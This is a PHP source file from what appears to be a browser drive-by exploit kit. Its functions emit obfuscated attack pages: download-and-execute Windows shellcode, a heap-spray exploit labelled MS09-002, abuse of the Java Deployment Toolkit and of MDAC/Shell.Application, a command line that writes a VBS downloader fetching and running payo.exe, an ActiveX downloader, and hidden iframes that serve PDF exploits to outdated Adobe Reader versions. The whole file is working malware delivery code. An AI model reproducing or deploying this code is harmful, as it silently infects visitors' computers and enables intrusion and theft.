<?php

function _shellcode($s)
{ global $load;
$spl = "?ex=".$s;
 $O00OOOO0000 = unescape(
/*"\x33\xC0\x64\x8B\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B".
"\x58\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x58\x3C\x6A\x44\x5A".
"\xD1\xE2\x2B\xE2\x8B\xEC\xEB\x4F\x5A\x52\x83\xEA\x56\x89\x55\x04".
"\x56\x57\x8B\x73\x3C\x8B\x74\x33\x78\x03\xF3\x56\x8B\x76\x20\x03".
"\xF3\x33\xC9\x49\x50\x41\xAD\x33\xFF\x36\x0F\xBE\x14\x03\x38\xF2".
"\x74\x08\xC1\xCF\x0D\x03\xFA\x40\xEB\xEF\x58\x3B\xF8\x75\xE5\x5E".
"\x8B\x46\x24\x03\xC3\x66\x8B\x0C\x48\x8B\x56\x1C\x03\xD3\x8B\x04".
"\x8A\x03\xC3\x5F\x5E\x50\xC3\x8D\x7D\x08\x57\x52\xB8\x33\xCA\x8A".
"\x5B\xE8\xA2\xFF\xFF\xFF\x32\xC0\x8B\xF7\xF2\xAE\x4F\xB8\x65\x2E".
"\x65\x78\xAB\x66\x98\x66\xAB\xB0\x6C\x8A\xE0\x98\x50\x68\x6F\x6E".
"\x2E\x64\x68\x75\x72\x6C\x6D\x54\xB8\x8E\x4E\x0E\xEC\xFF\x55\x04".
"\x93\x50\x33\xC0\x50\x50\x56\x8B\x55\x04\x83\xC2\x7F\x83\xC2\x31".
"\x52\x50\xB8\x36\x1A\x2F\x70\xFF\x55\x04\x5B\x33\xFF\x57\x56\xB8".
"\x98\xFE\x8A\x0E\xFF\x55\x04\x57\xB8\xEF\xCE\xE0\x60\xFF\x55\x04".*/

"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03".
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74".
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E".
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03".
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C".
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40".
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C".
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC".
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F".
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB".
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83".
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF".
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF".
$load.$spl);
$O00OOOO0000 = '"'.$O00OOOO0000.'"';
return $O00OOOO0000;
}

function webstart() {
global $load;
$XXX = rnd_string(rand(13,25), '5');
$rndo0 = rnd_string(rand(13,25), '10');
$GrjgrjWE = '
<script>
var '. $XXX[0] .' = "http: -J-jar -J\\\\seller.comyr.com\\Java_Sun_Update_6.22.jar -fst=cmd.exe /c echo Const '.$rndo0[0].' = 1 > %TEMP%\hDfgD.vbs & echo Const '.$rndo0[1].' = 2 >> %TEMP%\hDfgD.vbs & echo Dim '.$rndo0[2].' >> %TEMP%\hDfgD.vbs & echo Set '.$rndo0[2].' = CreateObject(\"ADODB.Stream\") >> %TEMP%\hDfgD.vbs & echo '.$rndo0[2].'.Type = '.$rndo0[0].' >> %TEMP%\hDfgD.vbs & echo '.$rndo0[2].'.Open >> %TEMP%\hDfgD.vbs & echo '.$rndo0[2].'.Write '.$rndo0[3].'(Wscript.Arguments(0)) >> %TEMP%\hDfgD.vbs & echo '.$rndo0[2].'.SaveToFile Wscript.Arguments(1), '.$rndo0[1].' >> %TEMP%\hDfgD.vbs & echo Function '.$rndo0[3].'('.$rndo0[4].') >> %TEMP%\hDfgD.vbs & echo Dim '.$rndo0[5].' >> %TEMP%\hDfgD.vbs & echo Set '.$rndo0[5].' = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> %TEMP%\hDfgD.vbs & echo '.$rndo0[5].'.Open \"GET\", '.$rndo0[4].', False >> %TEMP%\hDfgD.vbs & echo '.$rndo0[5].'.Send >> %TEMP%\hDfgD.vbs & echo '.$rndo0[3].' = '.$rndo0[5].'.ResponseBody >> %TEMP%\hDfgD.vbs & echo End Function >> %TEMP%\hDfgD.vbs & echo Set '.$rndo0[6].' = CreateObject(\"WScript.Shell\") >> %TEMP%\hDfgD.vbs & echo '.$rndo0[6].'.Run \"%TEMP%\payo.exe\" >> %TEMP%\hDfgD.vbs & start %TEMP%\hDfgD.vbs '.$load.'?ex=Webstart %TEMP%\payo.exe";

if (window.navigator.appName == "Microsoft Internet Explorer") {
var '. $XXX[1] .' = document.createElement("OBJECT");

'. $XXX[1] .'.classid = "clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA";

'. $XXX[1] .'.launch('. $XXX[0] .');
} else {

var '. $XXX[1] .' = document.createElement("OBJECT");
var '. $XXX[2] .' = document.createElement("OBJECT");

'. $XXX[1] .'.type = "application/npruntime-scriptable-plugin;deploymenttoolkit";
'. $XXX[2] .'.type = "application/java-deployment-toolkit";
document.body.appendChild('. $XXX[1] .');
document.body.appendChild('. $XXX[2] .');

try {
'. $XXX[1] .'.launch('. $XXX[0] .');
} catch (e) {
'. $XXX[2] .'.launch('. $XXX[0] .');
}
}
</script>';

return $GrjgrjWE;
}

function java_exec()
{

	global $load;

	$url = $load . "?ex=Deserialize";

	$code = '
	<applet code="quote.Mailvue.class" archive="plugin.jar" width="'.rand(0,500).'" height="'.rand(0,500).'">
	<param name="data" VALUE="'. $url. '">
	<param name="cc" value="1">
	</applet>
	';




	$url = $load . "?ex=Deserialize";

	$chunk = 4;
	$l = strlen($url) - 2;

	$f = $l % $chunk;
	if($f != 0)
	{
		$fill = $chunk - $f;
		$url .= (strpos($url, "?") !== FALSE) ? "&" : "?";
		$fill--;

	    if($fill > 0)
		{
			$url.=substr(md5(microtime()), 0, $fill);
		}

	}

	$exec = base64_encode(strtoupper(bin2hex($url)));

	$code.= "\n\n
	<applet width='".rand(0,500)."' height='".rand(0,500)."' code='JavaFX' archive='plug.jar'>
		<param name=\"site\" VALUE=\"" .$exec. "\">
	</applet>\n
	";

	return $code;
}
function ms678() {
global $load;
$x0x = '</html>
</script>	
</body>
<BODY>
<OBJECT ID="DownloaderActiveX1" 
WIDTH="0" 
HEIGHT="0" 
CLASSID="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61" 
CODEBASE="http://c6.community.alice.it/download/DownloaderActiveX.cab#Version=1,0,0,1"> 
<PARAM NAME="propProgressbackground" VALUE="#bccee8"> 
<PARAM NAME="propTextbackground" VALUE="#f7f8fc"> 
<PARAM NAME="propBarColor" VALUE="#df0203"> 
<PARAM NAME="propTextColor" VALUE="#000000"> 
<PARAM NAME="propWidth" VALUE="0"> 
<PARAM NAME="propHeight" VALUE="0"> 
<PARAM NAME="propDownloadUrl" VALUE="'.$load.'?ex=MS678"> 
<PARAM NAME="propPostdownloadAction" VALUE="run">
<PARAM NAME="propInstallCompleteUrl" VALUE=""> 
<PARAM NAME="propbrowserRedirectUrl" VALUE=""> 
<PARAM NAME="propVerbose" VALUE="0"> 
<PARAM NAME="propInterrupt" VALUE="0"> 
</OBJECT>	
</script>	
</body>
</html>';

return $x0x;
}
function mem_cor() 
{
global $load;
$O0000OOOO = rnd_string(rand(8,15), '15');
$O0o0o0o = '
<script type="text/javascript">
var '. $O0000OOOO[0] .' = unescape('._shellcode("MS09-002").');
var '. $O0000OOOO[1] .' = new Array(); 
var '. $O0000OOOO[2] .' = 0x100000-('. $O0000OOOO[0] .'.length*2+0x01020); 
var '. $O0000OOOO[4] .' = unescape("%u0C0C%u0C0C"); 
while('. $O0000OOOO[4] .'.length<'. $O0000OOOO[2] .'/2) { '. $O0000OOOO[4] .'+='. $O0000OOOO[4] .';} 
var '. $O0000OOOO[3] .' = '. $O0000OOOO[4] .'.substring(0,'. $O0000OOOO[2] .'/2); 
delete '. $O0000OOOO[4] .'; 
for('. $O0000OOOO[5] .'=0; '. $O0000OOOO[5] .'<0xC0; '. $O0000OOOO[5] .'++) { 
	'. $O0000OOOO[1] .'['. $O0000OOOO[5] .'] = '. $O0000OOOO[3] .' + '. $O0000OOOO[0] .';
} 
CollectGarbage();
var '. $O0000OOOO[6] .'=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
var '. $O0000OOOO[7] .' = new Array();
for(var '. $O0000OOOO[11] .'=0;'. $O0000OOOO[11] .'<1000;'. $O0000OOOO[11] .'++) '. $O0000OOOO[7] .'.push(document.createElement("img"));
function '. $O0000OOOO[10] .'() { 
	'. $O0000OOOO[8] .'=document.createElement("tbody"); 
	'. $O0000OOOO[8] .'.click; 
	var '. $O0000OOOO[9] .' = '. $O0000OOOO[8] .'.cloneNode();	
	'. $O0000OOOO[8] .'.clearAttributes(); 
	'. $O0000OOOO[8] .'=null; CollectGarbage(); 
	for(var '. $O0000OOOO[11] .'=0;'. $O0000OOOO[11] .'<'. $O0000OOOO[7] .'.length;'. $O0000OOOO[11] .'++) '. $O0000OOOO[7] .'['. $O0000OOOO[11] .'].src='. $O0000OOOO[6] .'; 
	'. $O0000OOOO[9] .'.click;
}
window.setTimeout("'. $O0000OOOO[10] .'();",200);
</script>
';

return $O0o0o0o;
}

function mdac() // ie 6 ...
{
global $load;
$O000OOOOO = rnd_string(rand(10,19), '15');

$O000000OO = '
var '. $O000OOOOO[0] .'=\''.$load.'?ex=mdac\';
function '. $O000OOOOO[1] .'('. $O000OOOOO[7] .','. $O000OOOOO[8] .'){
var '. $O000OOOOO[2] .'=null;
try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .')}catch(e){}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .',"")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.CreateObject('. $O000OOOOO[8] .',"","")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject("",'. $O000OOOOO[8] .')}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject('. $O000OOOOO[8] .',"")}catch(e){}}
if(!'. $O000OOOOO[2] .'){try{'. $O000OOOOO[2] .'='. $O000OOOOO[7] .'.GetObject('. $O000OOOOO[8] .')}catch(e){}}
return('. $O000OOOOO[2] .');
}
function '. $O000OOOOO[3] .'('. $O000OOOOO[9] .'){
'. $O000OOOOO[10] .'="updates.exe";var '. $O000OOOOO[4] .'='. $O000OOOOO[9] .'.CreateObject("Scripting.FileSystemObject","");
var sap='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"Sh"+"e"+"l"+"l.App"+"l"+"ica"+"t"+"i"+"on");
var '. $O000OOOOO[11] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"ADODB.Stream");
var '. $O000OOOOO[5] .'=null;'. $O000OOOOO[10] .'='. $O000OOOOO[4] .'.BuildPath('. $O000OOOOO[4] .'.GetSpecialFolder(2),'. $O000OOOOO[10] .');'. $O000OOOOO[11] .'.Mode=3;
try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"Mic"+"ro"+"so"+"ft.XM"+"LH"+"T"+"TP");'. $O000OOOOO[5] .'.open("G"+"ET",'. $O000OOOOO[0] .',false);}
catch(e){try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"MSX"+"M"+"L2.XML"+"HT"+"TP");'. $O000OOOOO[5] .'.open("GE"+"T",'. $O000OOOOO[0] .',false);}
catch(e){try{'. $O000OOOOO[5] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"M"+"SX"+"ML2.Se"+"rv"+"erX"+"MLHT"+"TP");'. $O000OOOOO[5] .'.open("GET",'. $O000OOOOO[0] .',false);}
catch(e)
{
try
{
'. $O000OOOOO[5] .'=new XMLHttpRequest();
'. $O000OOOOO[5] .'.open("GET",'. $O000OOOOO[0] .',false);
}
catch(e){return 0;}}}}
'. $O000OOOOO[11] .'.Type=1;'. $O000OOOOO[5] .'.send(null);rb='. $O000OOOOO[5] .'.responseBody;'. $O000OOOOO[11] .'.Open();'. $O000OOOOO[11] .'.Write(rb);'. $O000OOOOO[11] .'.SaveTofile('. $O000OOOOO[10] .',2);sap.ShellExecute('. $O000OOOOO[10] .');
return 1;
}
function '. $O000OOOOO[6] .'(){
var '. $O000OOOOO[12] .'=0;
var '. $O000OOOOO[6] .'d=new Array(\'BD96C556-65A3-11D0-983A-00C04FC29E36\',\'BD96C556-65A3-11D0-983A-00C04FC29E30\',\'AB9BCEDD-EC7E-47E1-9322-D4A210617116\',\'0006F033-0000-0000-C000-000000000046\',\'0006F03A-0000-0000-C000-000000000046\',\'6e32070a-766d-4ee6-879c-dc1fa91d2fc3\',\'6414512B-B978-451D-A0D8-FCFDF33E833C\',\'7F5B7F63-F06F-4331-8A26-339E03C0AE3D\',\'06723E09-F4C2-43c8-8358-09FCD1DB0766\',\'639F725F-1B2D-4831-A9FD-874847682010\',\'BA018599-1DB3-44f9-83B4-461454C84BF8\',\'D0C07D56-7C69-43F1-B4A0-25F5A11FAB19\',\'E8CCCDDF-CA28-496b-B050-6C07C962476B\',null);
while('. $O000OOOOO[6] .'d['. $O000OOOOO[12] .'])
{
var '. $O000OOOOO[9] .'=null;
'. $O000OOOOO[9] .'=document.createElement("object");
'. $O000OOOOO[9] .'.setAttribute("classid","clsid:"+'. $O000OOOOO[6] .'d['. $O000OOOOO[12] .']);
if('. $O000OOOOO[9] .'){try{var '. $O000OOOOO[13] .'='. $O000OOOOO[1] .'('. $O000OOOOO[9] .',"S"+"he"+"l"+"l.App"+"lica"+"ti"+"on");
if('. $O000OOOOO[13] .'){if('. $O000OOOOO[3] .'('. $O000OOOOO[9] .'))return 1;}}catch(e){}}
'. $O000OOOOO[12] .'++;
}
}
'. $O000OOOOO[6] .'();

';

return $O000000OO;
}

// PDF
function pdf_all()
{
global $pdf;
$O000000OO = '
<script type="text/javascript">document.write(unescape("%3Ciframe%20src%3D%22'.$pdf.'%3Fex%3Dpdf_all%22%20width%3D%22'.rand(40, 499).'%22%20height%3D%22'.rand(40, 499).'%22%20frameborder%3D%220%22%3E%3C/iframe%3E"));</script>
';
return $O000000OO;
}

function pdf_ie()
{
global $pdf,$case_spl;
$rand010 = rnd_string(rand(10,15), '10');
$O000000OO = '<script type="text/javascript">
  document.write("<OBJECT id='.$rand010[0].' height=0 width=0 classid=clsid:CA8A9780-280D-11CF-A24D-444553540000></OBJECT>");
    var '.$rand010[1].' = '.$rand010[0].'.GetVersions();
    '.$rand010[1].' = '.$rand010[1].'.split(",");
	'.$rand010[1].' = '.$rand010[1].'[1].split("=");
	'.$rand010[1].' = '.$rand010[1].'[1];
	if (('.$rand010[1].' < "7.1.4") || ('.$rand010[1].' < "8.1.7") || ('.$rand010[1].' < "9.2"))
	{
		document.write(unescape("%3Ciframe%20src%3D%22'.$pdf.'%22%20width%3D%22'.rand(40, 499).'%22%20height%3D%22'.rand(40, 499).'%22%20frameborder%3D%220%22%3E%3C/iframe%3E"));
	}
	</script>
';
return $O000000OO;
}

// END OF PDF
function java_dnx()
{
	global $load;
	$rndo00 = rnd_string(rand(6, 12), '15');
	$cont="
	<applet width='".rand(0, 483)."' height='".rand(0, 497)."' code='Java_Sun_Update_6.class' archive='Java_Sun_Update_6.22.jar'>
	<param name='fst' value='cmd.exe /c echo Const ".$rndo00[0]." = 1 > %TEMP%\hDfgD.vbs & echo Const ".$rndo00[1]." = 2 >> %TEMP%\hDfgD.vbs & echo Dim ".$rndo00[2]." >> %TEMP%\hDfgD.vbs & echo Set ".$rndo00[2]." = CreateObject(\"ADODB.Stream\") >> %TEMP%\hDfgD.vbs & echo ".$rndo00[2].".Type = ".$rndo00[0]." >> %TEMP%\hDfgD.vbs & echo ".$rndo00[2].".Open >> %TEMP%\hDfgD.vbs & echo ".$rndo00[2].".Write ".$rndo00[3]."(Wscript.Arguments(0)) >> %TEMP%\hDfgD.vbs & echo ".$rndo00[2].".SaveToFile Wscript.Arguments(1), ".$rndo00[1]." >> %TEMP%\hDfgD.vbs & echo Function ".$rndo00[3]."(".$rndo00[4].") >> %TEMP%\hDfgD.vbs & echo Dim ".$rndo00[5]." >> %TEMP%\hDfgD.vbs & echo Set ".$rndo00[5]." = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> %TEMP%\hDfgD.vbs & echo ".$rndo00[5].".Open \"GET\", ".$rndo00[4].", False >> %TEMP%\hDfgD.vbs & echo ".$rndo00[5].".Send >> %TEMP%\hDfgD.vbs & echo ".$rndo00[3]." = ".$rndo00[5].".ResponseBody >> %TEMP%\hDfgD.vbs & echo End Function >> %TEMP%\hDfgD.vbs & echo Set ".$rndo00[6]." = CreateObject(\"WScript.Shell\") >> %TEMP%\hDfgD.vbs & echo ".$rndo00[6].".Run \"%TEMP%\payo.exe\" >> %TEMP%\hDfgD.vbs & start %TEMP%\hDfgD.vbs ".$load."?ex=Java_Driveby %TEMP%\payo.exe'>
	</applet>";

	return $cont;

}


function next_spl($refr)
{
global $O0000000O,$OOOOOO000,$OOOOO0000,$OOOO00000;
$O0000000O++;
$O0o0o0o = '
<script type="text/javascript">
function dorefresh() { 
window.location="?ex='.$O0000000O.'&br='.$OOOOOO000.'&vers='.$OOOOO0000[2].'&s='.$OOOO00000.'"; 
}
setTimeout("dorefresh();",'.$refr.'000);
</script>
';

return $O0o0o0o;
}

?>